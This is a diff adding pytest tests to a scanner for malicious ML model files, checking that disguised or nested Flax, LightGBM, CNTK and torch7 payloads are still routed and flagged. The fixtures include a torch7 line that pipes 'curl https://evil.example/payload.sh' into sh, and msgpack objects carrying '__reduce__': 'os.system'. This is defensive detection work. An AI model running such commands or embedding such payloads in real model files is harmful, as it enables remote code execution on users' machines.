@@ -7,6 +7,7 @@ import gzip
 import importlib
 import json
 import pickle
+import sys
 import zipfile
 from collections.abc import Iterator
 from contextlib import contextmanager
@@ -936,6 +937,164 @@ def test_scan_file_routes_malicious_lightgbm_with_binary_prelude(tmp_path: Path)
     )
 
 
+@pytest.mark.parametrize("flax_prefix", [b"\x81\xa6params\xc1\x00", b"\x82\xa6params\x80\xc1\x00"])
+def test_scan_file_does_not_let_invalid_flax_prefix_mask_malicious_lightgbm(
+    tmp_path: Path,
+    flax_prefix: bytes,
+) -> None:
+    disguised_lightgbm = tmp_path / "malformed-flax-prefix.jpg"
+    _write_malicious_lightgbm(disguised_lightgbm)
+    disguised_lightgbm.write_bytes(flax_prefix + disguised_lightgbm.read_bytes())
+
+    assert file_detection.detect_file_format(str(disguised_lightgbm)) == "lightgbm"
+    assert file_detection.detect_file_format_from_magic(str(disguised_lightgbm)) == "lightgbm"
+    assert file_detection.detect_file_format_for_skip_filter(str(disguised_lightgbm)) == "lightgbm"
+
+    result = scan_file(str(disguised_lightgbm))
+
+    assert result.scanner_name == "lightgbm"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("foreign_format", ["torch7", "cntk", "lightgbm"])
+def test_scan_file_preserves_foreign_findings_in_flax_content_overlap(tmp_path: Path, foreign_format: str) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    payload = tmp_path / f"overlap-{foreign_format}.jpg"
+    if foreign_format == "torch7":
+        payload.write_bytes(
+            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+    elif foreign_format == "cntk":
+        _write_malicious_cntk(payload)
+    else:
+        _write_malicious_lightgbm(payload)
+    payload.write_bytes(
+        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+    )
+
+    result = scan_file(str(payload), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_fails_closed_when_flax_overlap_scanner_is_unavailable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    payload = tmp_path / "unavailable-overlap.jpg"
+    _write_malicious_lightgbm(payload)
+    payload.write_bytes(
+        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+    )
+    original_loader = core_module._registry.load_scanner_by_id
+
+    def load_scanner_by_id(scanner_id: str) -> type[Any] | None:
+        if scanner_id == "lightgbm":
+            return None
+        return original_loader(scanner_id)
+
+    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", load_scanner_by_id)
+
+    result = scan_file(str(payload), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    check = next(check for check in result.checks if check.name == "Format Detection")
+    assert check.details["format"] == "lightgbm"
+    assert check.details["preferred_scanner_id"] == "lightgbm"
+
+
+def test_scan_file_preserves_foreign_findings_in_nested_flax_content_overlap(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    nested_payload = tmp_path / "nested-overlap.jpg"
+    _write_malicious_lightgbm(nested_payload)
+    nested_payload.write_bytes(
+        nested_payload.read_bytes()
+        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+    )
+    archive = tmp_path / "overlap.zip"
+    _create_misnamed_zip(archive, {"nested-overlap.jpg": nested_payload.read_bytes()})
+
+    result = scan_file(str(archive), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "scanner_config",
+    [{"exclude_scanners": ["flax_msgpack"]}, {"scanners": ["lightgbm"]}],
+    ids=["excluded-flax", "exact-lightgbm"],
+)
+def test_scan_file_preserves_selected_lightgbm_findings_in_flax_content_overlap(
+    tmp_path: Path,
+    scanner_config: dict[str, list[str]],
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    payload = tmp_path / "selected-overlap.jpg"
+    _write_malicious_lightgbm(payload)
+    payload.write_bytes(
+        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+    )
+
+    result = scan_file(str(payload), config={**scanner_config, "cache_scan_results": False})
+
+    assert result.scanner_name == "lightgbm"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Scanner Selection"
+        and check.details.get("kind") == "preferred"
+        and check.details.get("skipped_scanner_id") == "flax_msgpack"
+        for check in result.checks
+    )
+
+
+def test_scan_file_preserves_selected_nested_lightgbm_findings_in_flax_content_overlap(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    nested_payload = tmp_path / "selected-nested-overlap.jpg"
+    _write_malicious_lightgbm(nested_payload)
+    nested_payload.write_bytes(
+        nested_payload.read_bytes()
+        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+    )
+    archive = tmp_path / "selected-overlap.zip"
+    _create_misnamed_zip(archive, {"selected-nested-overlap.jpg": nested_payload.read_bytes()})
+
+    result = scan_file(
+        str(archive),
+        config={"scanners": ["zip", "lightgbm"], "cache_scan_results": False},
+    )
+
+    assert result.scanner_name == "zip"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
 def test_scan_file_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
     cntk_near_match = tmp_path / "cntk-near-match.jpg"
     lightgbm_near_match = tmp_path / "lightgbm-near-match.jpg"
@@ -986,15 +1145,202 @@ def test_scan_file_fails_closed_for_renamed_structural_msgpack_without_dependenc
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    checkpoint = tmp_path / "model.flaxy"
+    checkpoint = tmp_path / "model.jpg"
     checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
     monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)
+    monkeypatch.setitem(sys.modules, "msgpack", None)
 
     result = scan_file(str(checkpoint), config={"cache_scan_results": False})
 
     assert result.scanner_name == "flax_msgpack"
     assert result.success is False
     assert any(check.name == "msgpack Library Check" for check in result.checks)
+
+
+def test_scan_file_routes_renamed_flax_stream_with_malicious_trailing_object(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / "stream.jpg"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
+        + flax_msgpack_scanner.msgpack.packb({"__reduce__": "os.system"}, use_bin_type=True)
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+def test_scan_file_routes_renamed_flax_stream_with_later_checkpoint_object(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / "stream-later-root.jpg"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb({"metadata": {"producer": "flax"}}, use_bin_type=True)
+        + flax_msgpack_scanner.msgpack.packb(
+            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
+            use_bin_type=True,
+        )
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+@pytest.mark.parametrize("leading_scalar", [None, 123, 91], ids=["nil", "json-object-byte", "json-array-byte"])
+def test_scan_file_routes_renamed_flax_stream_with_leading_scalar_object(
+    tmp_path: Path,
+    leading_scalar: int | None,
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / f"stream-leading-scalar-{leading_scalar}.jpg"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb(leading_scalar, use_bin_type=True)
+        + flax_msgpack_scanner.msgpack.packb(
+            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
+            use_bin_type=True,
+        )
+    )
+
+    assert file_detection.detect_file_format(str(checkpoint)) == "flax_msgpack"
+    assert file_detection.detect_file_format_from_magic(str(checkpoint)) == "flax_msgpack"
+    assert file_detection.detect_file_format_for_skip_filter(str(checkpoint)) == "flax_msgpack"
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+@pytest.mark.parametrize("leading_scalar", [123, 91], ids=["json-object-byte", "json-array-byte"])
+def test_scan_file_routes_nested_renamed_flax_stream_with_json_delimiter_scalar(
+    tmp_path: Path,
+    leading_scalar: int,
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    nested_payload = flax_msgpack_scanner.msgpack.packb(
+        leading_scalar, use_bin_type=True
+    ) + flax_msgpack_scanner.msgpack.packb(
+        {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
+        use_bin_type=True,
+    )
+    archive = tmp_path / f"nested-leading-scalar-{leading_scalar}.zip"
+    _create_misnamed_zip(archive, {"payload.jpg": nested_payload})
+
+    result = scan_file(str(archive), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+def test_scan_file_does_not_raise_for_deep_json_array_near_match(tmp_path: Path) -> None:
+    payload = tmp_path / "deep-json-array.jpg"
+    payload.write_bytes((b"[" * 2000) + b"0" + (b"]" * 2000))
+
+    assert file_detection.detect_file_format(str(payload)) == "unknown"
+    assert file_detection.detect_file_format_from_magic(str(payload)) == "unknown"
+    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "unknown"
+
+    direct_result = scan_file(str(payload), config={"cache_scan_results": False})
+    archive = tmp_path / "deep-json-array.zip"
+    _create_misnamed_zip(archive, {"payload.jpg": payload.read_bytes()})
+    nested_result = scan_file(str(archive), config={"cache_scan_results": False})
+
+    assert direct_result.scanner_name == "unknown"
+    assert direct_result.success is True
+    assert nested_result.scanner_name == "zip"
+    assert nested_result.success is True
+
+
+def test_scan_file_fails_closed_for_renamed_flax_stream_with_scalar_padding_past_analysis_limit(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / "stream-scalar-padding.jpg"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb(None, use_bin_type=True) * 4097
+        + flax_msgpack_scanner.msgpack.packb(
+            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
+            use_bin_type=True,
+        )
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any("Msgpack stream object count exceeds configured limit" in issue.message for issue in result.issues)
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
+def test_scan_file_routes_renamed_flax_state_wrapper_with_malicious_attribute(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / "state-wrapper.jpg"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb(
+            {"state": {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}},
+            use_bin_type=True,
+        )
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+@pytest.mark.parametrize("suffix", [".jpg", ".flax"])
+@pytest.mark.parametrize(
+    "embedded_bytes",
+    [
+        b"\n4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n",
+        (
+            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+            b" CompositeFunction primitive_functions "
+        ),
+        (
+            b"\x00tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
+            b"tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
+        ),
+    ],
+)
+def test_scan_file_keeps_flax_analysis_when_payload_contains_embedded_format_signature(
+    tmp_path: Path,
+    suffix: str,
+    embedded_bytes: bytes,
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / f"embedded{suffix}"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb(
+            {"params": {"blob": embedded_bytes}, "__reduce__": "os.system"},
+            use_bin_type=True,
+        )
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
 
 
 def test_scan_file_routes_malicious_explicit_flax_suffix_to_flax_scanner(tmp_path: Path) -> None:
@@ -1053,6 +1399,50 @@ def test_scan_file_routes_large_malicious_renamed_flax_msgpack_with_later_root_t
     assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
 
 
+@pytest.mark.parametrize("wrapped", [False, True], ids=["direct-root", "state-wrapper-root"])
+def test_scan_file_analyzes_renamed_flax_after_confirmed_root_exceeds_routing_budget(
+    tmp_path: Path,
+    wrapped: bool,
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    params = {f"f{i}": i for i in range(2100)}
+    checkpoint_state: dict[str, object] = {"params": params} if not wrapped else {"state": {"params": params}}
+    checkpoint_state["__reduce__"] = "os.system"
+    checkpoint = tmp_path / f"confirmed-root-{wrapped}.jpg"
+    checkpoint.write_bytes(flax_msgpack_scanner.msgpack.packb(checkpoint_state, use_bin_type=True))
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert not any(check.name == "MessagePack Routing Analysis Limit" for check in result.checks)
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+@pytest.mark.parametrize("wrapped", [False, True], ids=["direct-root", "state-wrapper-root"])
+def test_scan_file_analyzes_nested_renamed_flax_after_confirmed_root_exceeds_routing_budget(
+    tmp_path: Path,
+    wrapped: bool,
+) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    params = {f"f{i}": i for i in range(2100)}
+    checkpoint_state: dict[str, object] = {"params": params} if not wrapped else {"state": {"params": params}}
+    checkpoint_state["__reduce__"] = "os.system"
+    archive = tmp_path / f"confirmed-root-{wrapped}.zip"
+    _create_misnamed_zip(
+        archive,
+        {"payload.jpg": flax_msgpack_scanner.msgpack.packb(checkpoint_state, use_bin_type=True)},
+    )
+
+    result = scan_file(str(archive), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
 def test_scan_file_fails_closed_for_renamed_msgpack_routing_probe_limit(tmp_path: Path) -> None:
     if not flax_msgpack_scanner.HAS_MSGPACK:
         pytest.skip("msgpack unavailable")
@@ -1095,6 +1485,29 @@ def test_scan_file_fails_closed_when_renamed_msgpack_routing_read_cannot_complet
 
     assert result.scanner_name == "flax_msgpack"
     assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
+def test_scan_file_fails_closed_for_small_renamed_msgpack_routing_probe_limit(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / "ambiguous-small.jpg"
+    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb(
+            {"metadata": large_metadata, "state": {"selected": True}},
+            use_bin_type=True,
+        )
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)
+
+    assert checkpoint.stat().st_size < FLAX_MSGPACK_STRUCTURE_READ_BYTES
+    assert result.scanner_name == "flax_msgpack"
     assert result.metadata["scan_outcome"] == "inconclusive"
     assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
     assert core_module.determine_exit_code(aggregate) == 2
